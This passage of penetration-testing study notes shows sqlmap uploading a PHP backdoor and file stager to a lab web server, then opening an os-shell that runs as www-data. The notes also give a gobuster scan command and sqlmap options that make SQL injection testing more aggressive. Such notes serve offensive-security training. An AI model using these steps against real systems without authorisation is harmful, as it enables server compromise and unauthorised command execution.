[14:20:51] [INFO] the file stager has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
[14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpbetmz.php
[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: '/var/www/html/tmp'
```
+ Once <mark style="background: #D2B3FFA6;">sqlmap</mark> confirms the vulnerability, it prompts us for the language the web application is written in, which is PHP in this case
+ Next, <mark style="background: #D2B3FFA6;">sqlmap</mark> uploads the webshell to the specified web folder and returns the interactive shell, from which we can issue regular system commands

#### Perquisite Information Gathering 
Should always do a gobuster scan that looks for specific file types with `-x`:
+ Example: `gobuster dir -u http://192.168.226.47 -w /usr/share/wordlists/dirb/big.txt -x pdf,txt`

#### Aggressive SQLi Identification 
Can increase the `level` and `risk` in order to potentially find more vulnerabilities:
```
--level=LEVEL       Level of tests to perform (1-5, default 1)
--risk=RISK         Risk of tests to perform (1-3, default 1)
```
+ This will take much longer to test, so should specify the dbms if possible with `--dbms`
	+ Example `--dbms=MSSQL` 
